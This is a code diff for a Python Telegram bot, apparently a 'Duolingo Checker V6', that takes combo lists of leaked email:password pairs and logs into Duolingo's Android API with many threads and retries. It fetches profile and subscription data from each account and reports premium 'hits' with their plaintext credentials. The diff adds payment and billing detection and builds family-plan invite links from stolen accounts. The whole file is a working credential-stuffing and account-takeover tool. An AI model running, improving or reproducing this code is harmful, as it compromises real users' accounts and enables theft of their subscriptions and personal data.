@@ -8,6 +8,7 @@ import time
 import uuid
 import logging
 import threading
+import re
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import traceback
@@ -37,19 +38,16 @@ current_executor = None
 current_futures = None
 check_lock = threading.Lock()
 
-# Store hits
 all_super_hits = []
 all_family_hits = []
 all_free_accounts = []
 hits_per_page = 10
 
-# Stats
 super_count = 0
 family_count = 0
 free_count = 0
 fail_count = 0
 
-# Batch stats
 last_batch_super = 0
 last_batch_family = 0
 last_batch_free = 0
@@ -59,7 +57,6 @@ def is_admin(user_id):
     return user_id in ADMIN_IDS
 
 def create_session():
-    """Create a requests session with retry logic to prevent crashes"""
     session = requests.Session()
     retry_strategy = Retry(
         total=MAX_RETRIES,
@@ -67,11 +64,7 @@ def create_session():
         status_forcelist=[429, 500, 502, 503, 504],
         allowed_methods=["GET", "POST"]
     )
-    adapter = HTTPAdapter(
-        max_retries=retry_strategy,
-        pool_connections=100,
-        pool_maxsize=100
-    )
+    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
     session.mount("https://", adapter)
     session.mount("http://", adapter)
     return session
@@ -100,289 +93,307 @@ def generate_ua():
 
 # ========== LANGUAGE MAPPING ==========
 LANG_MAP = {
-    "en": "🇺🇸 English", "es": "🇪🇸 Spanish", "fr": "🇫🇷 French",
-    "de": "🇩🇪 German", "it": "🇮🇹 Italian", "pt": "🇧🇷 Portuguese",
-    "ja": "🇯🇵 Japanese", "ko": "🇰🇷 Korean", "zh": "🇨🇳 Chinese",
-    "ru": "🇷🇺 Russian", "ar": "🇸🇦 Arabic", "hi": "🇮🇳 Hindi",
-    "tr": "🇹🇷 Turkish", "nl": "🇳🇱 Dutch", "sv": "🇸🇪 Swedish",
-    "pl": "🇵🇱 Polish", "uk": "🇺🇦 Ukrainian", "vi": "🇻🇳 Vietnamese",
-    "th": "🇹🇭 Thai", "id": "🇮🇩 Indonesian", "el": "🇬🇷 Greek",
-    "he": "🇮🇱 Hebrew", "ro": "🇷🇴 Romanian", "cs": "🇨🇿 Czech",
-    "hu": "🇭🇺 Hungarian", "ga": "🇮🇪 Irish", "cy": "🏴 Welsh",
-    "hv": "🐉 High Valyrian", "tlh": "🖖 Klingon", "la": "🏛 Latin",
-    "eo": "🌍 Esperanto", "gn": "🇵🇾 Guarani", "yi": "✡️ Yiddish",
-    "zu": "🇿🇦 Zulu", "sw": "🇰🇪 Swahili", "fi": "🇫🇮 Finnish",
-    "da": "🇩🇰 Danish", "no": "🇳🇴 Norwegian",
+    "en": "🇺🇸 EN", "es": "🇪🇸 ES", "fr": "🇫🇷 FR",
+    "de": "🇩🇪 DE", "it": "🇮🇹 IT", "pt": "🇧🇷 PT",
+    "ja": "🇯🇵 JA", "ko": "🇰🇷 KO", "zh": "🇨🇳 ZH",
+    "ru": "🇷🇺 RU", "ar": "🇸🇦 AR", "hi": "🇮🇳 HI",
+    "tr": "🇹🇷 TR", "nl": "🇳🇱 NL", "sv": "🇸🇪 SV",
+    "pl": "🇵🇱 PL", "uk": "🇺🇦 UK", "vi": "🇻🇳 VI",
+    "th": "🇹🇭 TH", "id": "🇮🇩 ID", "el": "🇬🇷 EL",
+    "he": "🇮🇱 HE", "ro": "🇷🇴 RO", "cs": "🇨🇿 CS",
+    "hu": "🇭🇺 HU", "ga": "🇮🇪 GA", "cy": "🏴 CY",
+    "hv": "🐉 HV", "tlh": "🖖 KL", "la": "🏛 LA",
+    "eo": "🌍 EO", "gn": "🇵🇾 GN", "yi": "✡️ YI",
+    "zu": "🇿🇦 ZU", "sw": "🇰🇪 SW", "fi": "🇫🇮 FI",
+    "da": "🇩🇰 DA", "no": "🇳🇴 NO",
 }
 
-def get_lang_name(code):
+def get_lang(code):
     return LANG_MAP.get(code, f"🌐 {code}")
 
-# ========== PAYMENT METHOD DETECTION ==========
-def detect_payment_method(data):
-    subscription = data.get("subscription", {})
-    shop_items = data.get("shopItems", [])
+# ========== BILLING CYCLE FROM PRODUCT ID ==========
+def parse_billing_from_product(product_id):
+    """Extract billing cycle from product ID patterns like '12m', '1m', '6m', '3m'"""
+    if not product_id or product_id == "Unknown":
+        return None
+    pid = product_id.lower()
+    # Match patterns like .12m. or _12m_ or -12m-
+    m = re.search(r'[\._\-](\d+)m[\._\-]', pid)
+    if m:
+        months = int(m.group(1))
+        if months >= 12:
+            return "📆 Yearly"
+        elif months >= 6:
+            return "📅 6-Month"
+        elif months >= 3:
+            return "📅 Quarterly"
+        else:
+            return "📅 Monthly"
+    if "annual" in pid or "yearly" in pid or "year" in pid:
+        return "📆 Yearly"
+    if "month" in pid:
+        return "📅 Monthly"
+    return None
 
-    # Check for trial
+# ========== PAYMENT DETECTION (IMPROVED) ==========
+def detect_payment(data):
+    """Detect payment method from multiple API fields"""
+    subscription = data.get("subscription", {}) or {}
+    shop_items = data.get("shopItems", []) or []
+
+    # 1. Check subscription.purchasePlatform (most reliable from Android API)
+    platform = subscription.get("purchasePlatform", "").lower()
+    if platform:
+        if "google" in platform or "android" in platform:
+            return "🟢 Google Play"
+        if "apple" in platform or "ios" in platform:
+            return "🍎 Apple"
+        if "web" in platform or "stripe" in platform:
+            return "💳 Credit Card"
+
+    # 2. Check subscription.paymentProcessor
+    processor = subscription.get("paymentProcessor", "").lower()
+    if processor:
+        if "google" in processor:
+            return "🟢 Google Play"
+        if "apple" in processor:
+            return "🍎 Apple"
+        if "paypal" in processor:
+            return "💙 PayPal"
+        if "stripe" in processor or "braintree" in processor:
+            return "💳 Credit Card"
+
+    # 3. Check billingInfo inside subscription
+    billing_info = subscription.get("billingInfo", {}) or {}
+    bp = billing_info.get("paymentProcessor", "").lower()
+    if bp:
+        if "google" in bp:
+            return "🟢 Google Play"
+        if "apple" in bp:
+            return "🍎 Apple"
+        if "stripe" in bp or "braintree" in bp:
+            return "💳 Credit Card"
+
+    # 4. Check shopItems for subscription info
     for item in shop_items:
-        sub_info = item.get("subscriptionInfo", {})
-        sku = sub_info.get("productId", "").lower()
-        if "trial" in sku or "free" in sku:
-            return "🎁 Free Trial"
-
-    # Check payment processor
-    if subscription:
-        billing_info = subscription.get("billingInfo", {})
-        if billing_info:
-            processor = billing_info.get("paymentProcessor", "").lower()
-            if "google" in processor:
+        sub_info = item.get("subscriptionInfo", {}) or {}
+        sp = sub_info.get("purchasePlatform", "").lower()
+        if sp:
+            if "google" in sp or "android" in sp:
                 return "🟢 Google Play"
-            elif "apple" in processor:
-                return "🍎 Apple App Store"
-            elif "paypal" in processor:
-                return "💙 PayPal"
-            elif "stripe" in processor or "braintree" in processor:
+            if "apple" in sp or "ios" in sp:
+                return "🍎 Apple"
+            if "web" in sp:
                 return "💳 Credit Card"
 
-    # Check purchase platform
-    if subscription:
-        platform = subscription.get("purchasePlatform", "").lower()
-        if "google" in platform:
-            return "🟢 Google Play"
-        elif "apple" in platform or "ios" in platform:
-            return "🍎 Apple App Store"
-        elif "web" in platform:
-            return "💳 Credit Card (Web)"
-
-    # Check product ID patterns
-    product_id = ""
-    if subscription:
-        product_id = subscription.get("productId", "")
-    for item in shop_items:
-        sub_info = item.get("subscriptionInfo", {})
-        if sub_info.get("productId"):
-            product_id = sub_info.get("productId", "")
-
-    product_lower = product_id.lower()
-    if "google" in product_lower or "android" in product_lower:
-        return "🟢 Google Play"
-    elif "apple" in product_lower or "ios" in product_lower or "itunes" in product_lower:
-        return "🍎 Apple App Store"
-    elif "web" in product_lower or "direct" in product_lower:
-        return "💳 Credit Card (Web)"
-
-    # Check receipt data
-    for item in shop_items:
-        sub_info = item.get("subscriptionInfo", {})
+        # Check receipt
         receipt = sub_info.get("receipt", {})
         if receipt:
-            receipt_str = str(receipt).lower()
-            if "google" in receipt_str:
+            rs = json.dumps(receipt).lower() if isinstance(receipt, dict) else str(receipt).lower()
+            if "google" in rs or "purchasetoken" in rs:
                 return "🟢 Google Play"
-            elif "apple" in receipt_str or "itunes" in receipt_str:
-                return "🍎 Apple App Store"
+            if "apple" in rs or "itunes" in rs:
+                return "🍎 Apple"
 
+    # 5. Check product ID patterns
+    product_id = subscription.get("productId", "")
+    for item in shop_items:
+        si = item.get("subscriptionInfo", {}) or {}
+        if si.get("productId"):
+            product_id = si.get("productId", "")
+    if product_id:
+        pl = product_id.lower()
+        if "google" in pl or "android" in pl:
+            return "🟢 Google Play"
+        if "apple" in pl or "ios" in pl:
+            return "🍎 Apple"
+
+    # 6. Fallback: if premium but unknown method
     if data.get("hasPlus") or data.get("has_item_premium_subscription"):
-        return "💎 Premium (Unknown)"
+        return "💎 Unknown"
 
-    return "❓ Unknown"
+    return "❓ N/A"
 
-# ========== SOCIAL LINKS DETECTION ==========
-def detect_social_links(data):
-    social_links = []
+# ========== SOCIAL DETECTION ==========
+def detect_social(data):
+    links = []
+    for acc in (data.get("linkedAccounts", []) or []):
+        p = acc.get("provider", "").lower()
+        if "google" in p:
+            links.append("🔴G")
+        elif "facebook" in p:
+            links.append("🔵FB")
+        elif "apple" in p:
+            links.append("🍎A")
+    if data.get("hasFacebookId") and "🔵FB" not in links:
+        links.append("🔵FB")
+    if data.get("hasGoogleId") and "🔴G" not in links:
+        links.append("🔴G")
+    return " ".join(links) if links else "❌ None"
 
-    linked_accounts = data.get("linkedAccounts", [])
-    for account in linked_accounts:
-        provider = account.get("provider", "").lower()
-        if "google" in provider:
-            social_links.append("🔴 Google")
-        elif "facebook" in provider:
-            social_links.append("🔵 Facebook")
-        elif "apple" in provider:
-            social_links.append("🍎 Apple ID")
-
-    if data.get("hasFacebookId") and "🔵 Facebook" not in social_links:
-        social_links.append("🔵 Facebook")
-    if data.get("hasGoogleId") and "🔴 Google" not in social_links:
-        social_links.append("🔴 Google")
-
-    return social_links if social_links else ["❌ None"]
-
-# ========== SUBSCRIPTION DETAILS ==========
-def extract_subscription_details(data):
-    details = {
-        "product_id": "Unknown",
-        "renewing": "Unknown",
-        "expiry": "Unknown",
-        "invite_token": None,
-        "payment_method": "Unknown",
-        "billing_cycle": "Unknown"
+# ========== EXTRACT SUBSCRIPTION ==========
+def extract_sub(data):
+    d = {
+        "product": "N/A",
+        "renew": "❓",
+        "expiry": "N/A",
+        "invite": None,
+        "payment": "❓",
+        "billing": "❓"
     }
 
-    subscription = data.get("subscription", {})
-    if subscription:
-        if subscription.get("productId"):
-            details["product_id"] = subscription.get("productId")
-        if subscription.get("renewing") is not None:
-            details["renewing"] = "✅ Yes" if subscription.get("renewing") else "❌ No"
-        if subscription.get("expirationTime"):
-            expiry_ms = subscription.get("expirationTime")
-            if expiry_ms and expiry_ms > 1000000000000:
-                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
-        elif subscription.get("expectedExpiration"):
-            expiry_ms = subscription.get("expectedExpiration")
-            if expiry_ms and expiry_ms > 1000000000000:
-                details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
-        if subscription.get("billingPeriod"):
-            period = subscription.get("billingPeriod", "").lower()
-            if "month" in period:
-                details["billing_cycle"] = "📅 Monthly"
-            elif "year" in period:
-                details["billing_cycle"] = "📆 Yearly"
+    sub = data.get("subscription", {}) or {}
+    items = data.get("shopItems", []) or []
 
-    shop_items = data.get("shopItems", [])
-    for item in shop_items:
-        sub_info = item.get("subscriptionInfo", {})
-        if sub_info:
-            if details["product_id"] == "Unknown" and sub_info.get("productId"):
-                details["product_id"] = sub_info.get("productId")
-            if details["renewing"] == "Unknown" and sub_info.get("renewing") is not None:
-                details["renewing"] = "✅ Yes" if sub_info.get("renewing") else "❌ No"
-            if details["expiry"] == "Unknown" and sub_info.get("expectedExpiration"):
-                expiry_ms = sub_info.get("expectedExpiration")
-                if expiry_ms and expiry_ms > 1000000000000:
-                    details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
+    # Product ID
+    if sub.get("productId"):
+        d["product"] = sub["productId"]
+    for item in items:
+        si = item.get("subscriptionInfo", {}) or {}
+        if si.get("productId") and d["product"] == "N/A":
+            d["product"] = si["productId"]
 
-        family_info = item.get("familyPlanInfo", {})
-        if family_info and family_info.get("inviteToken"):
-            details["invite_token"] = family_info.get("inviteToken")
+    # Renewing
+    if sub.get("renewing") is not None:
+        d["renew"] = "✅" if sub["renewing"] else "❌"
+    for item in items:
+        si = item.get("subscriptionInfo", {}) or {}
+        if d["renew"] == "❓" and si.get("renewing") is not None:
+            d["renew"] = "✅" if si["renewing"] else "❌"
 
-    details["payment_method"] = detect_payment_method(data)
-    return details
+    # Expiry - check multiple fields
+    expiry_ms = None
+    for key in ["expirationTime", "expectedExpiration", "expiresTime"]:
+        if sub.get(key):
+            expiry_ms = sub[key]
+            break
+    if not expiry_ms:
+        for item in items:
+            si = item.get("subscriptionInfo", {}) or {}
+            for key in ["expectedExpiration", "expirationTime", "expiresTime"]:
+                if si.get(key):
+                    expiry_ms = si[key]
+                    break
+            if expiry_ms:
+                break
+    if expiry_ms and isinstance(expiry_ms, (int, float)):
+        if expiry_ms > 1000000000000:
+            d["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
+        elif expiry_ms > 1000000000:
+            d["expiry"] = datetime.fromtimestamp(expiry_ms).strftime("%Y-%m-%d")
 
+    # Billing cycle - from subscription field first, then parse from product ID
+    period = sub.get("billingPeriod", "").lower()
+    if period:
+        if "month" in period:
+            d["billing"] = "📅 Monthly"
+        elif "year" in period or "annual" in period:
+            d["billing"] = "📆 Yearly"
+        elif "quarter" in period:
+            d["billing"] = "📅 Quarterly"
+    
+    if d["billing"] == "❓":
+        # Try billingCycleMonths
+        bcm = sub.get("billingCycleMonths")
+        if bcm:
+            if bcm >= 12:
+                d["billing"] = "📆 Yearly"
+            elif bcm >= 6:
+                d["billing"] = "📅 6-Month"
+            elif bcm >= 3:
+                d["billing"] = "📅 Quarterly"
+            else:
+                d["billing"] = "📅 Monthly"
+
+    if d["billing"] == "❓":
+        parsed = parse_billing_from_product(d["product"])
+        if parsed:
+            d["billing"] = parsed
+
+    # Family invite
+    for item in items:
+        fi = item.get("familyPlanInfo", {}) or {}
+        if fi.get("inviteToken"):
+            d["invite"] = fi["inviteToken"]
+
+    # Payment
+    d["payment"] = detect_payment(data)
+
+    return d
+
+# ========== PREMIUM CHECK ==========
 def is_premium_account(data):
-    shop_items = data.get("shopItems", [])
-
-    for item in shop_items:
-        family_info = item.get("familyPlanInfo", {})
-        if family_info and family_info.get("inviteToken"):
-            return True, "FAMILY", family_info.get("inviteToken")
-
-    for item in shop_items:
-        sub_info = item.get("subscriptionInfo", {})
-        if sub_info:
-            product_id = sub_info.get("productId", "")
-            if "trial" in product_id.lower():
-                continue
-            if product_id and product_id != "N/A":
-                return True, "SUPER", None
-
-    subscription = data.get("subscription", {})
-    if subscription:
-        if subscription.get("productId") and "trial" not in subscription.get("productId", "").lower():
+    items = data.get("shopItems", []) or []
+    for item in items:
+        fi = item.get("familyPlanInfo", {}) or {}
+        if fi.get("inviteToken"):
+            return True, "FAMILY", fi["inviteToken"]
+    for item in items:
+        si = item.get("subscriptionInfo", {}) or {}
+        pid = si.get("productId", "")
+        if "trial" in pid.lower():
+            continue
+        if pid and pid != "N/A":
             return True, "SUPER", None
-
-    if data.get("has_item_premium_subscription") == True:
+    sub = data.get("subscription", {}) or {}
+    if sub.get("productId") and "trial" not in sub.get("productId", "").lower():
         return True, "SUPER", None
-    if data.get("hasPlus") == True:
+    if data.get("has_item_premium_subscription"):
         return True, "SUPER", None
-
+    if data.get("hasPlus"):
+        return True, "SUPER", None
     return False, "FREE", None
 
-# ========== FORMAT HIT MESSAGE ==========
-def format_hit_message(email, password, data, plan_type, sub_details, invite_token=None):
-    """Beautiful formatted hit message with all requested info"""
-    username = data.get("username", "N/A")
-    total_xp = data.get("totalXp", 0)
-    streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
-    learning_lang = data.get("learningLanguage", "N/A")
-    from_lang = data.get("fromLanguage", "N/A")
-
-    created_at_raw = data.get("createdAt", None)
-    if created_at_raw:
-        try:
-            if isinstance(created_at_raw, (int, float)):
-                created_date = datetime.fromtimestamp(created_at_raw / 1000).strftime("%Y-%m-%d")
-            else:
-                created_date = str(created_at_raw)[:10]
-        except:
-            created_date = "Unknown"
-    else:
-        created_date = "Unknown"
-
-    social_links = detect_social_links(data)
-    social_text = " ┃ ".join(social_links)
-
-    learning_display = get_lang_name(learning_lang)
-    from_display = get_lang_name(from_lang)
+# ========== COMPACT HIT MESSAGE ==========
+def format_hit(email, password, data, plan_type, sub, invite_token=None):
+    username = data.get("username", "?")
+    xp = data.get("totalXp", 0)
+    streak = 0
+    sd = data.get("streakData")
+    if sd:
+        streak = sd.get("length", 0)
+    gems = 0
+    gc = data.get("gemsConfig")
+    if gc:
+        gems = gc.get("gems", 0)
+    learn = get_lang(data.get("learningLanguage", "?"))
+    from_l = get_lang(data.get("fromLanguage", "?"))
+    social = detect_social(data)
 
     if invite_token:
-        sub_details["invite_token"] = invite_token
+        sub["invite"] = invite_token
 
-    # Gems info
-    gems = 0
-    gems_config = data.get("gemsConfig", {})
-    if gems_config:
-        gems = gems_config.get("gems", 0)
+    # Get all courses being learned
+    courses = data.get("courses", []) or []
+    course_list = []
+    for c in courses[:5]:  # max 5
+        cl = c.get("learningLanguage", "")
+        if cl:
+            course_list.append(get_lang(cl))
+    courses_str = " ".join(course_list) if course_list else learn
 
-    if plan_type == "FAMILY":
-        header = "👨‍👩‍👧‍👦 FAMILY MANAGER"
-        badge = "🏠"
-    else:
-        header = "👑 SUPER PREMIUM"
-        badge = "💎"
+    badge = "👨‍👩‍👧‍👦 FAMILY" if plan_type == "FAMILY" else "💎 SUPER"
 
-    msg = f"""
-{'━' * 38}
-{badge}  {header}
-{'━' * 38}
+    msg = f"""{'━' * 32}
+{badge}
+{'━' * 32}
+📧 `{email}:{password}`
 
-📧  `{email}:{password}`
+👤 {username} ∙ ⭐{xp:,} ∙ 🔥{streak}d ∙ 💎{gems:,}
+📚 {courses_str} ← {from_l}
+🔗 {social}
 
-╭─── 👤 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗜𝗡𝗙𝗢 ────────────────╮
-│  🏷  Username: {username}
-│  ⭐  XP: {total_xp:,}
-│  🔥  Streak: {streak} days
-│  💎  Gems: {gems:,}
-│  📅  Joined: {created_date}
-╰────────────────────────────────────╯
+💳 {sub['payment']} ∙ {sub['billing']}
+🔁 Renew: {sub['renew']} ∙ ⏰ {sub['expiry']}
+📦 `{sub['product']}`"""
 
-╭─── 📚 𝗟𝗘𝗔𝗥𝗡𝗜𝗡𝗚 ──────────────────╮
-│  🎯  Learning: {learning_display}
-│  🏠  From: {from_display}
-╰────────────────────────────────────╯
-
-╭─── 💳 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 ────────────────╮
-│  📦  Product: `{sub_details['product_id']}`
-│  💰  Payment: {sub_details['payment_method']}
-│  🔄  Billing: {sub_details['billing_cycle']}
-│  🔁  Auto-Renew: {sub_details['renewing']}
-│  ⏰  Expires: {sub_details['expiry']}
-╰────────────────────────────────────╯
-
-╭─── 🔗 𝗦𝗢𝗖𝗜𝗔𝗟 𝗟𝗜𝗡𝗞𝗦 ────────────────╮
-│  {social_text}
-╰────────────────────────────────────╯"""
-
-    if plan_type == "FAMILY" and sub_details.get("invite_token"):
-        invite_link = f"https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
-        msg += f"""
-
-╭─── 🔗 𝗙𝗔𝗠𝗜𝗟𝗬 𝗜𝗡𝗩𝗜𝗧𝗘 ────────────────╮
-│  🎟  `{invite_link}`
-╰────────────────────────────────────╯"""
+    if plan_type == "FAMILY" and sub.get("invite"):
+        link = f"https://www.duolingo.com/family-plan?invite={sub['invite']}"
+        msg += f"\n🎟 `{link}`"
     elif plan_type == "FAMILY":
-        msg += f"""
+        msg += "\n🎟 ⚠️ No invite token"
 
-╭─── 🔗 𝗙𝗔𝗠𝗜𝗟𝗬 𝗜𝗡𝗩𝗜𝗧𝗘 ────────────────╮
-│  ⚠️  No invite token found
-╰────────────────────────────────────╯"""
-
-    msg += f"""
-
-{'━' * 38}
-🦉 Checked by: 𝗧𝗛𝗨𝗬𝗔 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟰
-{'━' * 38}"""
+    msg += f"\n{'━' * 32}\n🦉 𝗧𝗛𝗨𝗬𝗔 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟲"
 
     return msg
 
@@ -397,14 +408,11 @@ def check_single_account(email, password):
     for attempt in range(MAX_RETRIES):
         try:
             login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
-            distinct_id = str(uuid.uuid4())
-
             login_payload = {
-                "distinctId": distinct_id,
+                "distinctId": str(uuid.uuid4()),
                 "identifier": email,
                 "password": password
             }
-
             login_headers = get_headers(ua)
             login_headers["Content-Type"] = "application/json"
 
@@ -413,12 +421,10 @@ def check_single_account(email, password):
             if resp.status_code == 429:
                 time.sleep(RETRY_DELAY * (attempt + 1))
                 continue
-
             if resp.status_code != 200:
                 return email, password, "FAIL", "wrong credentials", None
 
-            login_data = resp.json()
-            user_id = login_data.get("id")
+            user_id = resp.json().get("id")
             if not user_id:
                 return email, password, "FAIL", "no user id", None
 
@@ -427,42 +433,40 @@ def check_single_account(email, password):
                 if cookie.name == "jwt_token":
                     jwt_token = cookie.value
                     break
-
             if not jwt_token:
                 return email, password, "FAIL", "no jwt token", None
 
+            # Extended fields for better billing detection
+            fields = [
+                "shopItems", "totalXp", "streakData", "username",
+                "fromLanguage", "learningLanguage", "gemsConfig",
+                "hasPlus", "has_item_premium_subscription",
+                "createdAt", "linkedAccounts", "hasFacebookId", "hasGoogleId",
+                "subscription", "profile", "courses",
+                "purchasePrice", "currentCourseId"
+            ]
             profile_url = (
                 f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}"
-                f"?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage"
-                f"%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription"
-                f"%2CcreatedAt%2ClinkedAccounts%2ChasFacebookId%2ChasGoogleId"
-                f"%2Csubscription%2Cprofile%2Ccourses"
+                f"?fields={','.join(fields)}"
             )
 
-            profile_headers = get_headers(ua, jwt_token)
-            resp2 = session.get(profile_url, headers=profile_headers, timeout=REQUEST_TIMEOUT)
+            resp2 = session.get(profile_url, headers=get_headers(ua, jwt_token), timeout=REQUEST_TIMEOUT)
 
             if resp2.status_code == 429:
                 time.sleep(RETRY_DELAY * (attempt + 1))
                 continue
-
             if resp2.status_code != 200:
-                return email, password, "FAIL", f"profile error {resp2.status_code}", None
+                return email, password, "FAIL", f"profile {resp2.status_code}", None
 
             data = resp2.json()
+            is_prem, plan_type, invite_token = is_premium_account(data)
 
-            is_premium, plan_type, invite_token = is_premium_account(data)
+            if not is_prem:
+                un = data.get("username", "?")
+                return email, password, "FREE", f"{un}|XP:{data.get('totalXp',0)}", None
 
-            if not is_premium:
-                username = data.get("username", "N/A")
-                total_xp = data.get("totalXp", 0)
-                streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
-                return email, password, "FREE", f"{username}|XP:{total_xp}|Streak:{streak}", None
-
-            sub_details = extract_subscription_details(data)
-
-            result = format_hit_message(email, password, data, plan_type, sub_details, invite_token)
-
+            sub = extract_sub(data)
+            result = format_hit(email, password, data, plan_type, sub, invite_token)
             return email, password, "HIT", result, plan_type
 
         except requests.exceptions.ConnectionError:
@@ -481,164 +485,107 @@ def check_single_account(email, password):
                 continue
             return email, password, "FAIL", str(e)[:40], None
         except Exception as e:
-            logging.error(f"Unexpected error for {email}: {e}")
+            logging.error(f"Error {email}: {e}")
             return email, password, "FAIL", str(e)[:40], None
         finally:
             session.close()
 
-    return email, password, "FAIL", "max retries exceeded", None
+    return email, password, "FAIL", "max retries", None
 
-# ========== MENU & UI ==========
+# ========== MENU ==========
 def send_main_menu(chat_id):
     total_hits = len(all_super_hits) + len(all_family_hits)
     status = "🟢 IDLE" if not checking_active else "🔴 CHECKING"
 
-    menu_text = f"""
-{'━' * 38}
-🦉  𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟰
-{'━' * 38}
+    msg = f"""{'━' * 32}
+🦉 𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟲
+{'━' * 32}
+👑 @thuyaaungzaw ∙ {status}
+🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x retry
 
-╭─── ℹ️ 𝗜𝗡𝗙𝗢 ──────────────────────╮
-│  👑  Owner: @thuyaaungzaw
-│  🤖  Bot: Premium Checker V4
-│  📡  Status: {status}
-╰────────────────────────────────────╯
-
-╭─── ⚙️ 𝗦𝗬𝗦𝗧𝗘𝗠 ─────────────────────╮
-│  🧵  Threads: {MAX_THREADS}
-│  🔄  Auto-Retry: {MAX_RETRIES}x
-│  📊  Update: Every {PROGRESS_INTERVAL}
-╰────────────────────────────────────╯
-
-╭─── 📈 𝗧𝗢𝗗𝗔𝗬'𝗦 𝗛𝗜𝗧𝗦 ───────────────╮
-│  👑  Super: {super_count}
-│  👨‍👩‍👧  Family: {family_count}
-│  💾  Total Saved: {total_hits}
-╰────────────────────────────────────╯
-"""
+💎 Super: {super_count} ∙ 👨‍👩‍👧 Family: {family_count}
+💾 Saved: {total_hits}"""
 
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
-        InlineKeyboardButton("🚀 START CHECK", callback_data="start_check"),
+        InlineKeyboardButton("🚀 START", callback_data="start_check"),
         InlineKeyboardButton("📊 STATS", callback_data="my_stats")
     )
     markup.row(
-        InlineKeyboardButton("💾 VIEW HITS", callback_data="view_hits"),
+        InlineKeyboardButton("💾 HITS", callback_data="view_hits"),
         InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
     )
-    markup.row(
-        InlineKeyboardButton("❌ CLOSE", callback_data="close_panel")
-    )
-
-    bot.send_message(chat_id, menu_text, parse_mode='Markdown', reply_markup=markup)
+    markup.row(InlineKeyboardButton("❌ CLOSE", callback_data="close_panel"))
+    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)
 
 def send_hits_list(chat_id, page=0):
     total_hits = len(all_super_hits) + len(all_family_hits)
     if total_hits == 0:
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu"))
-        bot.send_message(chat_id, "📭 No premium hits yet.\n\n📎 Send a combo file to start!", parse_mode='Markdown', reply_markup=markup)
+        markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
+        bot.send_message(chat_id, "📭 No hits yet. Send a combo file!", reply_markup=markup)
         return
 
     all_hits = []
-    for email, pwd, result in all_super_hits:
-        all_hits.append(("👑 SUPER", email, pwd, result))
-    for email, pwd, result in all_family_hits:
-        all_hits.append(("👨‍👩‍👧 FAMILY", email, pwd, result))
+    for e, p, r in all_super_hits:
+        all_hits.append(("💎", e, p, r))
+    for e, p, r in all_family_hits:
+        all_hits.append(("👨‍👩‍👧", e, p, r))
 
     total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
     page = max(0, min(page, total_pages - 1))
-
     start = page * hits_per_page
     end = min(start + hits_per_page, len(all_hits))
 
-    hit_list_text = ""
-    for i, item in enumerate(all_hits[start:end], start=start + 1):
-        plan, email, pwd, result = item
-        # Extract key info from result
-        lines = result.split('\n')
-        username = xp = streak = expiry = payment = "?"
+    text = f"💾 𝗛𝗜𝗧𝗦 ({page+1}/{total_pages})\n"
+    for i, (icon, e, p, r) in enumerate(all_hits[start:end], start=start+1):
+        # Extract compact info
+        lines = r.split('\n')
+        user_info = payment = expiry = "?"
         for line in lines:
-            if '🏷  Username:' in line:
-                username = line.split('Username:')[1].strip()[:15]
-            elif '⭐  XP:' in line:
-                xp = line.split('XP:')[1].strip()
-            elif '🔥  Streak:' in line:
-                streak = line.split('Streak:')[1].replace('days', '').strip()
-            elif '⏰  Expires:' in line:
-                expiry = line.split('Expires:')[1].strip()
-            elif '💰  Payment:' in line:
-                payment = line.split('Payment:')[1].strip()[:18]
+            if '👤' in line and '⭐' in line:
+                user_info = line.strip()[:40]
+            elif '⏰' in line:
+                parts = line.split('⏰')
+                if len(parts) > 1:
+                    expiry = parts[1].strip()[:10]
+            elif '💳' in line:
+                payment = line.strip()[2:30]
+        text += f"\n{icon} [{i}] `{e[:20]}..`\n   {user_info}\n   💳{payment} ⏰{expiry}\n"
 
-        hit_list_text += f"""╭─ [{i}] {plan}
-│ 📧 `{email[:25]}...`
-│ 👤 {username} ┃ ⭐ {xp} ┃ 🔥 {streak}d
-│ 💳 {payment} ┃ ⏰ {expiry}
-╰{'─' * 35}
-"""
-
-    message_text = f"""
-{'━' * 38}
-💾  𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗛𝗜𝗧𝗦
-{'━' * 38}
-
-👑 Super: {len(all_super_hits)}  ┃  👨‍👩‍👧 Family: {len(all_family_hits)}
-📄 Page {page + 1}/{total_pages}
-
-{hit_list_text}
-💡 Tap EXPORT to get full details
-"""
+    text += "\n💡 EXPORT for full details"
 
     markup = InlineKeyboardMarkup(row_width=3)
-    buttons = []
+    btns = []
     if page > 0:
-        buttons.append(InlineKeyboardButton("◀️ Prev", callback_data=f"hits_page_{page - 1}"))
-    buttons.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
+        btns.append(InlineKeyboardButton("◀️", callback_data=f"hits_page_{page-1}"))
